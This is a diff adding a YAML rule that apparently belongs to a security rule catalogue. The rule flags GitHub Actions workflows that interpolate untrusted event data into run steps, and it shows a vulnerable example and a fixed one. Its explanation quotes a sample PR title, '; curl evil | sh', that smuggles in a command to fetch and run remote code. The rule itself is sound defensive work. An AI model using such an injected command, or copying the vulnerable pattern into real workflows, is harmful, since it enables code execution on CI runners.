@@ -1,0 +1,18 @@
+# yaml-language-server: $schema=../schema.json
+id: gha-script-injection
+title: Untrusted event data interpolated into a run step
+severity: high
+cwe: [CWE-78]
+category: config
+languages: [github-actions]
+why: ${{ github.event.* }} is pasted into the script before it runs; a PR title like "; curl evil | sh" becomes code.
+fix: 'Pass the value through env: and quote it in the script.'
+references:
+  - https://cwe.mitre.org/data/definitions/78.html
+examples:
+  - language: github-actions
+    vulnerable: '- run: echo "${{ github.event.pull_request.title }}"'
+    fixed: |-
+      - env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: echo "$TITLE"
